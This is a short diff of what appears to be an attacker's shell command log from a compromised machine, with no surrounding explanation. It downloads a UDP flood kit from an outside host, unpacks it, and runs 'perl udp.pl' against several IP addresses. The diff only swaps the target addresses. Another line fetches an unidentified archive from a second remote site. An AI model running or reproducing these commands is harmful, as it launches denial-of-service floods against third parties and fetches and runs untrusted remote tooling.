@@ -40,8 +40,8 @@ cd .bot
 cd ..
 wget zeiteam.xhost.ro/flood/udp.tgz
 tar zxvf udp.tgz
-perl udp.pl 22.81.183.70 0 0
-perl udp.pl 22.81.183.70 0 0
+perl udp.pl 139.81.14.251 0 0
+perl udp.pl 139.81.14.251 0 0
 cd ..
 ls
 cd ssh
@@ -57,7 +57,7 @@ cd ..
 cd qu
 ls
 php -v
-perl udp.pl 253.11.125.250 0 0
+perl udp.pl 100.159.154.94 0 0
 wget myliftclub.com/xxxz.gz
 tar zxvf xxxz.gz
 cd x
